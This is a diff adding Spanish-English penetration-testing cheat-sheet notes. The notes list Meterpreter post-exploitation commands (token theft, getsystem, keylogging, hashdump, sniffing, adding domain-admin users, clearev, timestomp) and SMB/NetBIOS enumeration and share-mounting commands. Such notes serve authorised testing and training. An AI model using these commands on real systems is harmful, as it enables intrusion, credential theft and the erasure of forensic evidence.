@@ -1,3 +1,99 @@
+
+
+
+<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
+
+
+meterpreter comandos utiles:
+
+help
+sysinfo
+ls
+use priv
+ps
+migrate PID
+use incognito
+list_tokens -u
+list_tokens -g
+steal_token PID
+drop_token
+getsystem
+shell
+execute -f cmd.exe -i
+execute -f cmd.exe -H -i -t
+rev2self
+reg command
+setdesktop number
+screenshot
+upload file
+download file
+keyscan_start
+keyscan_dump
+keyscan_stop
+getprivs
+uictl enable keyboard/mouse
+background
+hashdump
+use sniffer
+sniffer_interfaces
+sniffer_dump interfaceID pcapname
+sniffer_dump interfaceID packet-buffer
+sniffer_stats interfaceID
+sniffer_stop interfaceID
+add_user username password -h ip
+add_group_user 'Domain admins' username -h ip
+clearev
+timestomp
+reboot
+search
+getuid
+
+
+
+
+<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
+
+
+smbclient:
+
+nmap'ear puerto 139
+o
+telnet'ear IP 139
+if open...
+nmblookup -B IP -S \*
+if it has <20>....el recurso está compartido
+                                            The values in the <xx> brackets can be:
+                                            00 base computernames and workgroups, also in "*" queries
+                                            01 master browser, in magic __MSBROWSE__ cookie
+                                            03 messaging/alerter service; name of logged-in user  <--- This one is cool too
+                                            20 resource-sharing "server service" name  <--- Check this one ---
+                                            1B domain master-browser name
+                                            1C domain controller name
+                                            1E domain/workgroup master browser election announcement [?]
+Herramientas relacionadas: nbtscan (Linux) + nbtstat (WIN) 
+
+$smbclient -L \\\\COMPUTER -I IP
+if password required, put the password ;)
+$smbclient -L \\\\COMPUTER\\C -I IP -d 3 -n NAMEusedInThisNETBIOSsession -U userNameUsed
+
+montando el sistema compartido:
+
+$mount -t cifs //IP/Recurso_compartido /mnt/Punto_de_montaje -o username=USER,password=PASS
+ó
+$mount -t smbfs IP:/Recurso_compartido /mnt/punto_de_montaje -o username=USER,workgroup=TEST
+ó
+$smbmount //IP/Recurso_compartido /mnt/Punto_de_montaje -o username=USER
+ó
+$smbmount "\\\Samba1\\Recurso" -U USER -c 'mount /Recurso -u 500 -g 100'
+
+
+
+
+
+<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
+
+
+
 ver servicios:
 
 $cat /etc/services 
